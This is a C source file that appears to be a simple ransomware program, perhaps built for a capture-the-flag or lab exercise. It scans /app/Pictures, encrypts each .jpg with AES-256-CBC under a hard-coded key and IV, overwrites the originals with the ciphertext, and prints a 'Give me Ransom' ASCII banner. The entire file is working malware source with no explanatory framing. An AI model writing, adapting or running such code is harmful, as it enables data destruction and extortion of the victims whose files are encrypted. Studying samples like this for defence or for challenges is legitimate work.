#include <dirent.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#define PICTURE_DIR "/app/Pictures" 

#define BUFSIZE 4096

static unsigned char key[32] = "e3c2b5dbf704f747382f034076852bdf";
static unsigned char iv[16] = "8872043e2bb48760";

int encrypt_file(unsigned char *__key, unsigned char *__iv, char *input, char *output)
{
    int retval;

    FILE *infp = fopen(input, "rb");
    FILE *outfp = fopen(output, "wb");
    if (!infp || !outfp) {
        retval = -1;
        goto close_file;
    }
    
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        retval = -1;
        goto free_ctx;
    }

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv) != 1) {
        retval = -1;
        goto free_ctx;
    }

    unsigned char *inbuf = malloc(BUFSIZE);
    unsigned char *outbuf = malloc(BUFSIZE + EVP_MAX_BLOCK_LENGTH);
    if (!inbuf || !outbuf) {
        retval = -1;
        goto free_buf;
    }

    size_t total_len = 0;
    size_t read_bytes;
    int outlen = 0;

    while ((read_bytes = fread(inbuf, 1, BUFSIZE, infp)) > 0) {
        if (EVP_EncryptUpdate(ctx, outbuf, &outlen, inbuf, read_bytes) != 1) {
            retval = -1;
            goto free_buf;
        }
        total_len += fwrite(outbuf, 1, outlen, outfp);
    }

    if (EVP_EncryptFinal_ex(ctx, outbuf, &outlen) != 1) {
        retval = -1;
        goto free_buf;
    }
    total_len += fwrite(outbuf, 1, outlen, outfp);

    retval = total_len;

free_buf:
    free(inbuf);
    free(outbuf);
free_ctx:
    EVP_CIPHER_CTX_free(ctx);
close_file:
    fclose(infp);
    fclose(outfp);

    return retval;
}

int decrypt_file(unsigned char *__key, char *input, char *output)
{
    int retval;

    FILE *infp = fopen(input, "rb");
    FILE *outfp = fopen(output, "wb");
    if (!infp || !outfp) {
        retval = -1;
        goto close_file;
    }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        retval = -1;
        goto free_ctx;
    }

    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv) != 1) {
        retval = -1;
        goto free_ctx;
    }

    char *inbuf = malloc(BUFSIZE);
    char *outbuf = malloc(BUFSIZE + EVP_MAX_BLOCK_LENGTH);
    if (!inbuf || !outbuf) {
        retval = -1;
        goto free_buf;
    }

    size_t total_len = 0;
    size_t read_bytes;
    int outlen = 0;

    while ((read_bytes = fread(inbuf, 1, BUFSIZE, infp)) > 0) {
        if (EVP_DecryptUpdate(ctx, outbuf, &outlen, inbuf, read_bytes) != 1) {
            retval = -1;
            goto free_buf;
        }
        total_len += fwrite(outbuf, 1, outlen, outfp);
    }

    if (EVP_DecryptFinal_ex(ctx, outbuf, &outlen) != 1) {
        retval = -1;
        goto free_buf;
    }
    total_len += fwrite(outbuf, 1, outlen, outfp);

    retval = total_len;

free_buf:
    free(inbuf);
    free(outbuf);
free_ctx:
    EVP_CIPHER_CTX_free(ctx);
close_file:
    fclose(infp);
    fclose(outfp);

    return retval;
}

void print_banner(){
    printf("                                                            ;i.\n");
    printf("                                                             M$L                    .;i.\n");
    printf("                                                             M$Y;                .;iii;;.\n");
    printf("                                                            ;$YY$i._           .iiii;;;;;\n");
    printf("                                                           .iiiYYYYYYiiiii;;;;i;iii;; ;;;\n");
    printf("    _____ _                                               .;iYYYYYYiiiiiiYYYiiiiiii;;  ;;;\n");
    printf("   / ____(_)                                           .YYYY$$$$YYYYYYYYYYYYYYYYiii;; ;;;;\n");
    printf("  | |  __ ___   _____   _ __ ___   ___               .YYY$$$$$$YYYYYY$$$$iiiY$$$$$$$ii;;;;\n");
    printf("  | | |_ | \\ \\ / / _ \\ | '_ ` _ \\ / _ \\             :YYYF`,  TYYYYY$$$$$YYYYYYYi$$$$$iiiii;\n");
    printf("  | |__| | |\\ V /  __/ | | | | | |  __/             Y$MM: \\  :YYYY$$P\"````\"T$YYMMMMMMMMiiYY.\n");
    printf("   \\_____|_| \\_/ \\___| |_| |_| |_|\\___|          `.;$$M$$b.,dYY$$Yi; .(     .YYMMM$$$MMMMYY\n");
    printf("  |  __ \\                                      .._$MMMMM$!YYYYYYYYYi;.`\"  .;iiMMM$MMMMMMMYY\n");
    printf("  | |__) |__ _ _ __  ___  ___  _ __ ___         ._$MMMP` ```\"\"4$$$$$iiiiiiii$MMMMMMMMMMMMMY;\n");
    printf("  |  _  // _` | '_ \\/ __|/ _ \\| '_ ` _ \\         MMMM$:       :$$$$$$$MMMMMMMMMMM$$MMMMMMMYYL\n");
    printf("  | | \\ \\ (_| | | | \\__ \\ (_) | | | | | |      :MMMM$$.    .;PPb$$$$MMMMMMMMMM$$$$MMMMMMiYYU:\n");
    printf("  |_|  \\_\\__,_|_| |_|___/\\___/|_| |_| |_|       iMM$$;;: ;;;;i$$$$$$$MMMMM$$$$MMMMMMMMMMYYYYY\n");
    printf("                                                 `$$$$i .. ``:iiii!*\\`.$$$$$$$$$MMMMMMM$YiYYY\n");
    printf("                                                 :Y$$iii;;;.. ` ..;;i$$$$$$$$$MMMMMM$$YYYYiYY:\n");
    printf("                                                  :$$$$$iiiiiii$$$$$$$$$$$MMMMMMMMMMYYYYiiYYYY.\n");
    printf("                                                   `$$$$$$$$$$$$$$$$$$$$MMMMMMMM$YYYYYiiiYYYYYY\n");
    printf("                                                    YY$$$$$$$$$$$$$$$$MMMMMMM$$YYYiiiiiiYYYYYYY\n");
    printf("                                                   :YYYYYY$$$$$$$$$$$$$$$$$$YYYYYYYiiiiYYYYYYi'\n");
}

int main(){
    DIR* dir = opendir(PICTURE_DIR);
    struct dirent* entry;
    while(entry = readdir(dir)){
        if(entry->d_type != DT_REG) continue; // only process regular files
        char* filename = entry->d_name;
        size_t len = strlen(filename);
        if(len > 4 && strcmp(filename + len - 4, ".jpg") == 0){
            // printf("Found .jpg: %s\n", filename);
            const char* path = "/app/Pictures/";
            const char* encoded_str = ".enc";
            char input_file[128] = {0};
            char output_file[128] = {0};
            char dec_input_file[128] = {0};
            char dec_output_file[128] = {0};
            strcat(input_file, path);
            strcat(input_file, filename);
            strcat(output_file, input_file);
            strcat(output_file, encoded_str);
            memcpy(dec_input_file,input_file,sizeof(dec_input_file));
            memcpy(dec_output_file,output_file,sizeof(dec_output_file));

            int retval = decrypt_file(key, dec_input_file, dec_output_file);
            if(retval > 0) {
                if(remove(dec_output_file)){
                    printf("Delete file failed.");
                }
                continue; // the file has been encrypted
            }
            encrypt_file(key, iv, input_file, output_file);\
            if(rename(output_file, input_file)){
                printf("Rename failed.\n");
            }
        }
    }
    print_banner();
    return 0;
}